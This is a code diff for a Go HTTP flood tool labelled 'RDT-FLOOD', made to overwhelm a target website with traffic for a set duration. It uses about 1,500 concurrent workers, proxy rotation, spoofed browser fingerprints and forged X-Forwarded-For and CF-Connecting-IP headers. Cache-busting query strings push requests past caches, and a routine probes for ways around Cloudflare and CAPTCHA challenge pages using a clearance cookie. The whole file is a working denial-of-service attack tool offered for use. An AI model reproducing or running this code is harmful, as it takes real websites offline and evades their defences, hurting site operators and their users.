@@ -4,9 +4,12 @@ import (
 "bufio"
 "context"
 "crypto/tls"
+"fmt"
+"io"
 "math/rand"
 "net"
 "net/http"
+"net/http/cookiejar"
 "net/url"
 "os"
 "os/signal"
@@ -19,55 +22,84 @@ import (
 )
 
 const (
-workers = 1550
-requestTimeout = 3 * time.Second
+wrk= 1500
+to = 5 * time.Second
+sub= 5
+RPS_CONTROL = 300
+KEEP_ALIVE= 60 * time.Second
 )
 
 var UA = []string{
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
+"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+"Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
 "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36",
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
-"Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
-"Mozilla/5.0 (Android 15; Mobile; rv:137.0) Gecko/137.0 Firefox/137.0",
-"Mozilla/5.0 (Android 14; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-"Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
-"Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/112.0.0.0",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/112.0.0.0",
 }
 
-var ASEP = []string{
+var ACC = []string{
 "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
 "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
 "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
 "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+"*/*",
 }
 
-var ASEPJAWA = []string{
+var LAN = []string{
 "en-US,en;q=0.9,id;q=0.8",
 "en-US,en;q=0.9",
 "en-GB,en;q=0.9",
 "en-US,en;q=0.8,id;q=0.7",
 "en-US,en;q=0.9,zh;q=0.8",
 "en-US,en;q=0.9,ja;q=0.8",
+"en-US,en;q=0.5",
+"en;q=0.9,id;q=0.1",
 }
 
-var CARI = []string{
+var REF = []string{
 "https://www.google.com/search?q=",
 "https://www.bing.com/search?q=",
 "https://www.yahoo.com/search?p=",
 "https://www.duckduckgo.com/?q=",
+}
+
+var ENC = []string{
+"gzip, deflate, br",
+"gzip, deflate",
+"gzip",
+"br",
+"deflate",
+"identity",
+}
+
+var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
+var CKS = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+var PATH = []string{
+"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml",
+"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check",
+"/wp-admin/", "/wp-login.php", "/admin/login", "/admin/panel",
+"/search", "/category/", "/tag/", "/feed/", "/comment/",
+"/user/", "/profile/", "/dashboard", "/settings", "/logout",
+"/login", "/register", "/forgot-password", "/reset-password",
+"/product", "/products", "/category/products", "/shop",
+"/cart", "/checkout", "/payment", "/success", "/cancel",
+"/blog", "/post", "/article", "/news", "/event",
+"/contact", "/about", "/team", "/career", "/faq",
+}
+
+type CLI struct {
+client *http.Client
+ip string
 }
 
 func init() {
@@ -75,112 +107,394 @@ runtime.GOMAXPROCS(runtime.NumCPU())
 rand.Seed(time.Now().UnixNano())
 }
 
-func Browser(ua string) (browser string, version string, platform string, mobile bool) {
-if strings.Contains(ua, "Edg") {
-browser = "Edge"
-} else if strings.Contains(ua, "OPR") || strings.Contains(ua, "Opera") {
-browser = "Opera"
-} else if strings.Contains(ua, "Firefox") {
-browser = "Firefox"
-} else if strings.Contains(ua, "Safari") && !strings.Contains(ua, "Chrome") {
-browser = "Safari"
-} else if strings.Contains(ua, "Chrome") {
-browser = "Chrome"
+func HIN(ua string) (scu, scm, scp string) {
+scu = `"Not?A_Brand";v="99"`
+scm = "?0"
+scp = "Windows"
+var version string
+var major string
+if strings.Contains(ua, "Chrome/") {
+idx := strings.Index(ua, "Chrome/")
+if idx != -1 {
+start := idx + len("Chrome/")
+end := strings.Index(ua[start:], " ")
+if end == -1 {
+end = len(ua[start:])
+}
+version = ua[start : start+end]
+parts := strings.Split(version, ".")
+if len(parts) > 0 {
+major = parts[0]
+scu = fmt.Sprintf(`"Chromium";v="%s", "Google Chrome";v="%s", "Not?A_Brand";v="99"`, major, major)
+}
+}
+} else if strings.Contains(ua, "Edg/") {
+idx := strings.Index(ua, "Edg/")
+if idx != -1 {
+start := idx + len("Edg/")
+end := strings.Index(ua[start:], " ")
+if end == -1 {
+end = len(ua[start:])
+}
+version = ua[start : start+end]
+parts := strings.Split(version, ".")
+if len(parts) > 0 {
+major = parts[0]
+scu = fmt.Sprintf(`"Chromium";v="%s", "Microsoft Edge";v="%s", "Not?A_Brand";v="99"`, major, major)
+}
+}
+} else if strings.Contains(ua, "OPR/") {
+idx := strings.Index(ua, "OPR/")
+if idx != -1 {
+start := idx + len("OPR/")
+end := strings.Index(ua[start:], " ")
+if end == -1 {
+end = len(ua[start:])
+}
+version = ua[start : start+end]
+parts := strings.Split(version, ".")
+if len(parts) > 0 {
+major = parts[0]
+scu = fmt.Sprintf(`"Chromium";v="%s", "Opera";v="%s", "Not?A_Brand";v="99"`, major, major)
+}
+}
 } else {
-browser = "Other"
+scu = ""
 }
-
-if strings.Contains(ua, "Windows NT") {
-platform = "Windows"
-} else if strings.Contains(ua, "Mac OS X") || strings.Contains(ua, "Macintosh") {
-platform = "macOS"
-} else if strings.Contains(ua, "Linux") && !strings.Contains(ua, "Android") {
-platform = "Linux"
-} else if strings.Contains(ua, "Android") {
-platform = "Android"
-} else if strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
-platform = "iOS"
+if strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
+scm = "?1"
+if strings.Contains(ua, "Android") {
+scp = "Android"
 } else {
-platform = "Windows"
+scp = "iOS"
 }
-
-if strings.Contains(ua, "Mobile") || strings.Contains(ua, "Android") || strings.Contains(ua, "iPhone") || strings.Contains(ua, "iPad") {
-mobile = true
-} else {
-mobile = false
-}
-
-switch browser {
-case "Chrome":
-if idx := strings.Index(ua, "Chrome/"); idx != -1 {
-ver := ua[idx+7:]
-if dot := strings.Index(ver, "."); dot != -1 {
-version = ver[:dot]
-}
-}
-if version == "" {
-version = "146"
-}
-case "Edge":
-if idx := strings.Index(ua, "Edg/"); idx != -1 {
-ver := ua[idx+4:]
-if dot := strings.Index(ver, "."); dot != -1 {
-version = ver[:dot]
-}
-}
-if version == "" {
-version = "146"
-}
-case "Opera":
-if idx := strings.Index(ua, "OPR/"); idx != -1 {
-ver := ua[idx+4:]
-if dot := strings.Index(ver, "."); dot != -1 {
-version = ver[:dot]
-}
-}
-if version == "" {
-version = "112"
-}
-case "Firefox":
-if idx := strings.Index(ua, "Firefox/"); idx != -1 {
-ver := ua[idx+8:]
-if dot := strings.Index(ver, "."); dot != -1 {
-version = ver[:dot]
-}
-}
-if version == "" {
-version = "137"
-}
-case "Safari":
-if idx := strings.Index(ua, "Version/"); idx != -1 {
-ver := ua[idx+8:]
-if dot := strings.Index(ver, "."); dot != -1 {
-version = ver[:dot]
-}
-}
-if version == "" {
-version = "18"
-}
-default:
-version = "99"
+} else if strings.Contains(ua, "Windows") {
+scp = "Windows"
+} else if strings.Contains(ua, "Macintosh") || strings.Contains(ua, "Mac OS X") {
+scp = "macOS"
+} else if strings.Contains(ua, "Linux") {
+scp = "Linux"
 }
 return
 }
 
+func RIP() string {
+return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+}
+
+func RNP() string {
+return PATH[rand.Intn(len(PATH))]
+}
+
+var customCookie string = ""
+
+func GTV(rawURL string) []string {
+u, err := url.Parse(rawURL)
+if err != nil {
+return []string{rawURL}
+}
+host := u.Hostname()
+port := u.Port()
+path := u.Path
+if path == "" {
+path = "/"
+}
+query := u.RawQuery
+variations := []string{}
+addURL := func(s, h string) {
+full := s + "://" + h
+if port != "" {
+full += ":" + port
+}
+full += path
+if query != "" {
+full += "?" + query
+}
+variations = append(variations, full)
+}
+hosts := []string{host}
+if strings.HasPrefix(host, "www.") {
+hosts = append(hosts, host[4:])
+} else {
+hosts = append(hosts, "www."+host)
+}
+schemes := []string{"https", "http"}
+for _, s := range schemes {
+for _, h := range hosts {
+addURL(s, h)
+}
+}
+seen := map[string]bool{}
+unique := []string{}
+for _, v := range variations {
+if !seen[v] {
+seen[v] = true
+unique = append(unique, v)
+}
+}
+return unique
+}
+
+func ICP(body []byte) bool {
+lower := strings.ToLower(string(body))
+indicators := []string{
+"cloudflare", "just a moment", "checking your browser",
+"access denied", "blocked", "captcha", "challenge",
+"ddos", "security check", "verify you are human",
+}
+for _, ind := range indicators {
+if strings.Contains(lower, ind) {
+return true
+}
+}
+if strings.Contains(lower, "<title>") {
+start := strings.Index(lower, "<title>") + 7
+end := strings.Index(lower[start:], "</title>")
+if end != -1 {
+title := lower[start : start+end]
+for _, ind := range indicators {
+if strings.Contains(title, ind) {
+return true
+}
+}
+}
+}
+return false
+}
+
+type PRT struct {
+urlstring
+code int
+errerror
+}
+
+func PWR(ctx context.Context, client *http.Client, jobs <-chan string, results chan<- PRT) {
+for {
+select {
+case <-ctx.Done():
+return
+case rawURL, ok := <-jobs:
+if !ok {
+return
+}
+req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
+if err != nil {
+results <- PRT{url: rawURL, err: err}
+continue
+}
+ua := UA[rand.Intn(len(UA))]
+req.Header.Set("User-Agent", ua)
+req.Header.Set("Accept", ACC[rand.Intn(len(ACC))])
+req.Header.Set("Accept-Language", LAN[rand.Intn(len(LAN))])
+req.Header.Set("Accept-Encoding", ENC[rand.Intn(len(ENC))])
+req.Header.Set("Connection", "keep-alive")
+req.Header.Set("Cache-Control", "no-cache")
+req.Header.Set("Upgrade-Insecure-Requests", "1")
+if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
+if secChUA, _, _ := HIN(ua); secChUA != "" {
+req.Header.Set("Sec-Ch-Ua", secChUA)
+req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+req.Header.Set("Sec-Ch-Ua-Platform", "Windows")
+}
+}
+req.Header.Set("Referer", REF[rand.Intn(len(REF))]+"query")
+req.Header.Set("X-Forwarded-For", RIP())
+
+resp, err := client.Do(req)
+if err != nil {
+results <- PRT{url: rawURL, err: err}
+continue
+}
+bodyBytes, _ := io.ReadAll(resp.Body)
+resp.Body.Close()
+if ICP(bodyBytes) {
+results <- PRT{url: rawURL, code: resp.StatusCode, err: fmt.Errorf("challenge page")}
+continue
+}
+results <- PRT{url: resp.Request.URL.String(), code: resp.StatusCode, err: nil}
+}
+}
+}
+
+func RES(target, cookie string) (string, error) {
+variations := GTV(target)
+commonPaths := []string{"/", "/index.html", "/home", "/main", "/api/health", "/status", "/ping"}
+extra := []string{}
+for _, v := range variations {
+parsed, _ := url.Parse(v)
+if parsed != nil {
+base := parsed.Scheme + "://" + parsed.Host
+for _, p := range commonPaths {
+if p != "/" {
+extraVar := base + p
+if parsed.RawQuery != "" {
+extraVar += "?" + parsed.RawQuery
+}
+extra = append(extra, extraVar)
+}
+}
+clean := base + parsed.Path
+if clean != v {
+extra = append(extra, clean)
+}
+}
+}
+variations = append(variations, extra...)
+seen := map[string]bool{}
+unique := []string{}
+for _, v := range variations {
+if !seen[v] {
+seen[v] = true
+unique = append(unique, v)
+}
+}
+variations = unique
+rand.Shuffle(len(variations), func(i, j int) { variations[i], variations[j] = variations[j], variations[i] })
+
+jar, _ := cookiejar.New(nil)
+client := &http.Client{
+Timeout: 15 * time.Second,
+Jar: jar,
+CheckRedirect: func(req *http.Request, via []*http.Request) error {
+if len(via) >= 10 {
+return fmt.Errorf("Too many redirects")}
+return nil
+},
+Transport: &http.Transport{
+TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+DisableKeepAlives: false,
+MaxIdleConns:100,
+MaxIdleConnsPerHost: 100,
+IdleConnTimeout: 10 * time.Second,
+ForceAttemptHTTP2: true,
+ResponseHeaderTimeout: 3 * time.Second,
+},
+}
+
+if cookie != "" {
+parsedTarget, _ := url.Parse(target)
+if parsedTarget != nil {
+cookieMap := map[string]string{}
+for _, c := range strings.Split(cookie, "; ") {
+parts := strings.SplitN(c, "=", 2)
+if len(parts) == 2 {
+cookieMap[parts[0]] = parts[1]
+}
+}
+var cookies []*http.Cookie
+for name, value := range cookieMap {
+cookies = append(cookies, &http.Cookie{
+Name: name,
+Value:value,
+Path: "/",
+Domain: parsedTarget.Hostname(),
+})
+}
+client.Jar.SetCookies(parsedTarget, cookies)
+}
+}
+
+ctx, cancel := context.WithCancel(context.Background())
+defer cancel()
+jobs := make(chan string, len(variations))
+results := make(chan PRT, len(variations))
+
+numWorkers := 10
+var wg sync.WaitGroup
+for i := 0; i < numWorkers; i++ {
+wg.Add(1)
+go func() {
+defer wg.Done()
+PWR(ctx, client, jobs, results)
+}()
+}
+
+for _, v := range variations {
+jobs <- v
+}
+close(jobs)
+
+go func() {
+wg.Wait()
+close(results)
+}()
+
+var lastErr error
+for res := range results {
+if res.err == nil && res.code == http.StatusOK {
+cancel()
+return res.url, nil
+}
+if res.err != nil {
+lastErr = res.err
+}
+}
+if lastErr != nil {
+return "", fmt.Errorf("Failed : %v", lastErr)
+}
+return "", fmt.Errorf("Failed Bypassed")
+}
+
+func RWR(client *http.Client, req *http.Request, maxRedirects int) (*http.Response, error) {
+var resp *http.Response
+var err error
+currentReq := req
+for i := 0; i <= maxRedirects; i++ {
+resp, err = client.Do(currentReq)
+if err != nil {
+return nil, err
+}
+if resp.StatusCode < 300 || resp.StatusCode >= 400 {
+return resp, nil
+}
+loc, err := resp.Location()
+if err != nil {
+return resp, nil
+}
+io.Copy(io.Discard, resp.Body)
+resp.Body.Close()
+newReq, err := http.NewRequest("GET", loc.String(), nil)
+if err != nil {
+return nil, err
+}
+newReq.Header = currentReq.Header.Clone()
+currentReq = newReq
+}
+return resp, fmt.Errorf("Too many redirect %d", maxRedirects)
+}
+
 func main() {
 if len(os.Args) < 2 {
+fmt.Println("Cara make nya : <name file> <target> <duration> <cookie>")
 os.Exit(1)
 }
-LINK := os.Args[1]
-var durasi int = 0
+tgt := os.Args[1]
+dur := 0
 if len(os.Args) >= 3 {
 if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
-durasi = d
+dur = d
 }
 }
-PARSE, _ := url.Parse(LINK)
-host := PARSE.Hostname()
-var LinkProxy []*url.URL
+if len(os.Args) >= 4 {
+customCookie = os.Args[3]
+}
+
+finalURL, err := RES(tgt, customCookie)
+if err != nil {
+fmt.Printf("ޗ | Bypass Gagal : %v\n", err)
+os.Exit(1)
+}
+if finalURL != tgt {
+fmt.Printf("ޗ | Bypass : %s\n", finalURL)
+tgt = finalURL
+} else {
+fmt.Println("ޗ | Bypass : Activated!")
+}
+
+parsed, _ := url.Parse(tgt)
+host := parsed.Hostname()
+
+var proxies []*url.URL
 file, err := os.Open("proxy.txt")
 if err == nil {
 defer file.Close()
@@ -194,123 +508,211 @@ if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
 line = "http://" + line
 }
 if p, err := url.Parse(line); err == nil {
-LinkProxy = append(LinkProxy, p)
-}
-}
-}
-if len(LinkProxy) == 0 {
-LinkProxy = append(LinkProxy, nil)
-}
-clients := make([]*http.Client, len(LinkProxy))
-for i, UrlProxy := range LinkProxy {
-transport := &http.Transport{
+proxies = append(proxies, p)}}}
+if len(proxies) == 0 {
+proxies = append(proxies, nil)}
+
+wcs := make([]CLI, len(proxies))
+for i, PROXYLINK := range proxies {
+tr := &http.Transport{
 DialContext: (&net.Dialer{
-Timeout: 2 * time.Second,
-KeepAlive: 30 * time.Second,
+Timeout: 5 * time.Second,
+KeepAlive: KEEP_ALIVE,
 }).DialContext,
 DisableKeepAlives: false,
-MaxIdleConns: 20000,
-MaxIdleConnsPerHost: 10000,
+MaxIdleConns:50000,
+MaxIdleConnsPerHost: 50000,
 MaxConnsPerHost: 0,
-IdleConnTimeout: 60 * time.Second,
+IdleConnTimeout: KEEP_ALIVE,
 TLSClientConfig: &tls.Config{
 InsecureSkipVerify: true,
-MinVersion: tls.VersionTLS11,
+MinVersion: tls.VersionTLS12,
 MaxVersion: tls.VersionTLS13,
 NextProtos: []string{"h2", "http/1.1"},
+CipherSuites: []uint16{
+tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+},
 },
 ForceAttemptHTTP2: true,
-DisableCompression: true,
+DisableCompression:false,
 TLSHandshakeTimeout: 3 * time.Second,
 ResponseHeaderTimeout: 2 * time.Second,
-ExpectContinueTimeout: 0,
+ExpectContinueTimeout: 1 * time.Second,
 }
-if UrlProxy != nil {
-transport.Proxy = http.ProxyURL(UrlProxy)
+ip := ""
+if PROXYLINK != nil {
+tr.Proxy = http.ProxyURL(PROXYLINK)
+ip = PROXYLINK.Hostname()
 }
-clients[i] = &http.Client{
-Transport: transport,
-Timeout: requestTimeout,
+jar, _ := cookiejar.New(nil)
+client := &http.Client{
+Transport: tr,
+Timeout: to,
+Jar: jar,
 }
+wcs[i] = CLI{client: client, ip: ip}
 }
+fmt.Printf("ޗ | Method : RDT-FLOOD\n")
+fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
+fmt.Printf("[+] Target   : %s\n", tgt)
+fmt.Printf("[+] Time     : %d seconds\n", dur)
+fmt.Printf("[+] Proxies  : %d\n", len(proxies))
+fmt.Printf("[+] Conc     : %d\n", wrk)
+if customCookie != "" {
+fmt.Printf("[+] Cookie   : %s\n", customCookie[:30])
+} else {
+fmt.Printf("[+] Cookie   : False\n")
+}
+fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
 
 ctx, cancel := context.WithCancel(context.Background())
 var wg sync.WaitGroup
-
-if durasi > 0 {
-time.AfterFunc(time.Duration(durasi)*time.Second, func() {
+if dur > 0 {
+time.AfterFunc(time.Duration(dur)*time.Second, func() {
 cancel()
 })
 }
 
-for i := 0; i < workers; i++ {
+rateLimiter := time.NewTicker(time.Second / time.Duration(RPS_CONTROL))
+defer rateLimiter.Stop()
+
+for i := 0; i < wrk; i++ {
 wg.Add(1)
-cl := clients[i%len(clients)]
-go func(c *http.Client) {
+c := wcs[i%len(wcs)]
+go func(cli CLI) {
 defer wg.Done()
+var swg sync.WaitGroup
+for s := 0; s < sub; s++ {
+swg.Add(1)
+go func() {
+defer swg.Done()
 for ctx.Err() == nil {
-req, _ := http.NewRequest("HEAD", LINK, nil)
+select {
+case <-rateLimiter.C:
+default:
+}
+
+param := CBP[rand.Intn(len(CBP))]
+reqURL := tgt
+if strings.Contains(reqURL, "?") {
+reqURL += "&" + param + "=" + fmt.Sprintf("%d", rand.Int63())
+} else {
+reqURL += "?" + param + "=" + fmt.Sprintf("%d", rand.Int63())
+}
+if rand.Intn(5) == 0 {
+reqURL += "&big=" + strings.Repeat("x", 1024+rand.Intn(1024))
+}
+if rand.Intn(10) == 0 {
+reqURL += "&" + RNS(8) + "=" + RNS(12)
+}
+
+req, _ := http.NewRequest("GET", reqURL, nil)
+
 ua := UA[rand.Intn(len(UA))]
-accept := ASEP[rand.Intn(len(ASEP))]
-lang := ASEPJAWA[rand.Intn(len(ASEPJAWA))]
+ACCept := ACC[rand.Intn(len(ACC))]
+lang := LAN[rand.Intn(len(LAN))]
+enc := ENC[rand.Intn(len(ENC))]
 
 req.Header.Set("User-Agent", ua)
-req.Header.Set("Accept", accept)
+req.Header.Set("Accept", ACCept)
 req.Header.Set("Accept-Language", lang)
-req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
+req.Header.Set("Accept-Encoding", enc)
 req.Header.Set("Connection", "keep-alive")
+req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+req.Header.Set("Pragma", "no-cache")
 req.Header.Set("Upgrade-Insecure-Requests", "1")
-req.Header.Set("Sec-Fetch-Dest", "document")
-req.Header.Set("Sec-Fetch-Mode", "navigate")
-req.Header.Set("Sec-Fetch-Site", "cross-site")
-req.Header.Set("Sec-Fetch-User", "?1")
-req.Header.Set("Cache-Control", "max-age=0")
+req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
+req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", rand.Int63()))
 
-browser, version, platform, mobile := Browser(ua)
-
-secChUa := ""
-switch browser {
-case "Chrome":
-secChUa = "\"Chromium\";v=\"" + version + "\", \"Google Chrome\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
-case "Edge":
-secChUa = "\"Chromium\";v=\"" + version + "\", \"Microsoft Edge\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
-case "Opera":
-secChUa = "\"Chromium\";v=\"" + version + "\", \"Opera\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
-case "Firefox":
-secChUa = "\"Firefox\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
-case "Safari":
-secChUa = "\"Safari\";v=\"" + version + "\", \"Not?A_Brand\";v=\"99\""
-default:
-secChUa = "\"Not?A_Brand\";v=\"99\""
+if rand.Intn(3) == 0 {
+req.Header.Set("X-Original-URL", "/"+fmt.Sprintf("%x", rand.Int63()))
 }
-req.Header.Set("Sec-Ch-Ua", secChUa)
-
-if mobile {
-req.Header.Set("Sec-Ch-Ua-Mobile", "?1")
-} else {
-req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
+if rand.Intn(3) == 0 {
+req.Header.Set("X-Forwarded-Host", fmt.Sprintf("%x.example.com", rand.Int63()))
 }
-req.Header.Set("Sec-Ch-Ua-Platform", "\""+platform+"\"")
+if rand.Intn(3) == 0 {
+req.Header.Set("X-Request-ID", fmt.Sprintf("%x", rand.Int63()))
+}
+if rand.Intn(5) == 0 {
+req.Header.Set("X-Real-IP", RIP())
+}
+if rand.Intn(5) == 0 {
+req.Header.Set("CF-Connecting-IP", RIP())
+}
+if rand.Intn(5) == 0 {
+req.Header.Set("CDN-Loop", "cloudflare")
+}
+
+var cookies []string
+if customCookie != "" {
+cookies = append(cookies, customCookie)
+}
+for _, name := range CKS {
+if rand.Intn(2) == 0 {
+cookies = append(cookies, name+"="+fmt.Sprintf("%x", rand.Int63()))
+}
+}
+if len(cookies) > 0 {
+req.Header.Set("Cookie", strings.Join(cookies, "; "))
+}
 
 if rand.Intn(8) != 0 {
-se := CARI[rand.Intn(len(CARI))]
-req.Header.Set("Referer", se+host)
+ref := REF[rand.Intn(len(REF))]
+req.Header.Set("Referer", ref+host)
 }
 
-resp, err := c.Do(req)
+if strings.Contains(ua, "Chrome/") || strings.Contains(ua, "Edg/") || strings.Contains(ua, "OPR/") {
+scu, scm, scp := HIN(ua)
+if scu != "" {
+req.Header.Set("Sec-Ch-Ua", scu)
+req.Header.Set("Sec-Ch-Ua-Mobile", scm)
+req.Header.Set("Sec-Ch-Ua-Platform", scp)
+}
+}
+req.Header.Set("Sec-Fetch-Site", "none")
+req.Header.Set("Sec-Fetch-Mode", "navigate")
+req.Header.Set("Sec-Fetch-Dest", "document")
+
+PID := cli.ip
+if PID == "" {
+PID = RIP()
+}
+req.Header.Set("X-Forwarded-For", PID)
+req.Header.Set("X-Real-IP", PID)
+req.Header.Set("True-Client-IP", PID)
+
+resp, err := RWR(cli.client, req, 10)
 if err == nil {
+io.Copy(io.Discard, resp.Body)
 resp.Body.Close()
 }
 }
-}(cl)
+}()
+}
+swg.Wait()
+}(c)
 }
 
-sigChan := make(chan os.Signal, 1)
-signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+sig := make(chan os.Signal, 1)
+signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 select {
-case <-sigChan:
+case <-sig:
 cancel()
 case <-ctx.Done():
 }
 wg.Wait()
+}
+
+func RNS(length int) string {
+const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+b := make([]byte, length)
+for i := range b {
+b[i] = chars[rand.Intn(len(chars))]
+}
+return string(b)
 }
